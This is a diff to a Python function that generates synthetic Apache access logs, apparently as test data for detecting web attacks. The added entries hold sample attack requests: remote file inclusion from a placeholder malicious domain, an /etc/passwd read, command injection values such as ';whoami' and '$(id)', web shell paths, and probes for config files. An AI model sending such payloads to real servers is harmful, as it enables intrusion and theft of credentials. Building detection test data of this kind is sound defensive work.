@@ -102,6 +102,26 @@ def generate_sample_logs() -> str:
     scanner_raw = f'{sqli_ip} - - [{ts}] "GET /vulnerabilities HTTP/1.1" 200 1234 "-" "sqlmap/1.7 (https://sqlmap.org)"'
     lines.append(scanner_raw)
 
+    # 10. LFI / RFI Attempts
+    lfi_ip = "198.51.100.42"
+    lines.append(apache_line(lfi_ip, random_ts(base, 4200), "GET", "/index.php?file=http://malicious-domain.com/malware.txt", 200))
+    lines.append(apache_line(lfi_ip, random_ts(base, 4250), "GET", "/preview.php?path=/etc/passwd", 403))
+
+    # 11. Command Injection Attempts
+    cmd_ip = "203.0.113.88"
+    lines.append(apache_line(cmd_ip, random_ts(base, 4400), "POST", "/ping?ip=8.8.8.8;whoami", 200))
+    lines.append(apache_line(cmd_ip, random_ts(base, 4430), "GET", "/debug?check=$(id)", 500))
+
+    # 12. Web Shell access attempts
+    shell_ip = "185.220.101.5"
+    lines.append(apache_line(shell_ip, random_ts(base, 4600), "GET", "/uploads/shell.php", 200))
+    lines.append(apache_line(shell_ip, random_ts(base, 4650), "POST", "/css/cmd.jsp?cmd=ls", 404))
+
+    # 13. Credential and Config leaks
+    leak_ip = "91.108.4.1"
+    lines.append(apache_line(leak_ip, random_ts(base, 4800), "GET", "/config.json", 200))
+    lines.append(apache_line(leak_ip, random_ts(base, 4850), "GET", "/database.yml", 403))
+
     random.shuffle(lines)
     return "\n".join(lines)
 
